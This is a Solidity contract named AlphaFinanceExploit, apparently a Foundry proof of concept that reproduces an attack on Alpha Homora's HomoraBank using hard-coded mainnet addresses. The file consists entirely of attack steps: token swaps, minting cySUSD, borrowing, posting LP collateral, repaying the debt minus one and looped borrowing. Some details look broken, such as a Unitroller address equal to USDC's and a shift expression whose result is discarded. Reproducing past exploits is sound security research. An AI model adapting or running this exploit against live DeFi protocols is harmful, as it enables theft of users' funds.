// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import "openzeppelin/token/ERC1155/IERC1155Receiver.sol";

import "forge-std/console.sol";

interface IRouter { // uniswap v2 router interface
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ICERC20 is IERC20{
    function mint(uint mintAmount) external returns (uint);
}

interface IUnitroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint[] memory);
}

interface IHomoraBank {
    function execute(
    uint positionId,
    address spell,
    bytes memory data
  ) external payable returns (uint);

    function borrow(address token, uint amount) external;

    function putCollateral(
        address collToken,
        uint collId,
        uint amountCall
    ) external;

    function POSITION_ID() external returns (uint256);
    function accrue(address token) external;
    function getPositionDebts(uint256 positionId) external returns (address[] memory tokens, uint256[] memory debts);
    function repay(address token, uint amountCall) external;
    function getBankInfo(address token)
    external
    returns (
      bool isListed,
      address cToken,
      uint reserve,
      uint totalDebt,
      uint totalShare
    );
    function getPositionDebtShareOf(uint positionId, address token) external view returns (uint);

    function resolveReserve(address token) external;
}

interface IWERC20 {
    function mint(address token, uint amount) external;
    function setApprovalForAll(address , bool) external;
}

contract AlphaFinanceExploit{
    IRouter constant uniswapV2Router02 = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 constant uni = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant susd = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
    IERC20 constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUnitroller constant ironBankUnitroller = IUnitroller(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ICERC20 constant cySusd = ICERC20(0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8);
    IHomoraBank constant homoraBank = IHomoraBank(0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb);
    IERC20 constant uniPairLPToken = IERC20(0xd3d2E2692501A5c9Ca623199D38826e513033a17);
    IWERC20 constant werc20 = IWERC20(0xe28D9dF7718b0b5Ba69E01073fE82254a9eD2F98);
    
    uint256 positionId;

    fallback() external payable{}

    function step2() external payable {
        // 1 swaps ETH -> UNI
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(uni);
        uniswapV2Router02.swapExactETHForTokens{value: 0.5 ether}(
            1,
            path,
            address(this),
            1613195981
        );

        // 2 supply ETH + UNI to Uniswap pool
        uni.approve(address(uniswapV2Router02), type(uint256).max);
        uint256 uniAmount = uni.balanceOf(address(this));
        uniswapV2Router02.addLiquidityETH{value: 0.5 ether}(address(uni), uniAmount, 1, 1, address(this), 1613195981);

        // 3 swap ETH -> sUSD 
        path[1] = address(susd);
        uniswapV2Router02.swapExactETHForTokens{value: 0.5 ether}(1, path, address(this), 1613195981);
        
        // 4 deposit sUSD to Creamâ€™s Iron Bank (getting cysUSD)
        susd.approve(address(cySusd), type(uint256).max);
        uint256 susdAmount = susd.balanceOf(address(this));
        require(susdAmount > 894386566919930349147, "susd amount not enough");
        cySusd.mint(894386566919930349147);
    }

    function step3() external {
        // 1 borrow susd
        positionId = homoraBank.POSITION_ID();
        console.log("LP Token %s", uniPairLPToken.balanceOf(address(this)));
        homoraBank.borrow(address(susd), 1000000000000000000000);
        uint256 susdAmount = susd.balanceOf(address(this));
        require(susdAmount > 0, "borrow not success");

        // 2  put lp token as collacteral before homora bank's check
        uint256 lpTokenAmount = uniPairLPToken.balanceOf(address(this));
        uniPairLPToken.approve(address(werc20), type(uint256).max);
        werc20.mint(address(uniPairLPToken), lpTokenAmount);
        werc20.setApprovalForAll(address(homoraBank), true);
        homoraBank.putCollateral(address(werc20), 1209299932290980665713177030673858520201944054295, lpTokenAmount);
    }

    function step4() external {
        // 1 repay debt - 1
        homoraBank.accrue(address(susd));
        (address[] memory tokens, uint256[] memory debts) = homoraBank.getPositionDebts(positionId);
        uint256 repayAmount = debts[0] - 1;
        susd.approve(address(homoraBank), type(uint256).max);
        homoraBank.repay(address(susd), repayAmount);
    }

    function step6(uint256 _n) external {
        // borrow totalDebt - 1
        (,,,uint totalDebt,) = homoraBank.getBankInfo(address(susd)); 
        uint256 borrowAmount = totalDebt - 1;

        for (uint i = 0; i < _n; i++) {
            homoraBank.borrow(address(susd), borrowAmount);
            borrowAmount << 1;
        }
        uint256 bal = susd.balanceOf(address(this)); //21881436807390184302
        console.log("susd BalanceOf after step6 = %s", bal);
        cySusd.mint(bal);
    }

    function msgSenderAndTxOrigin() external {
        console.log("msg.sender = %s", msg.sender);
        console.log("tx.origin = %s", tx.origin);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    /**
     * @notice IERC1155Receiver
     */
    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata) 
        external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

}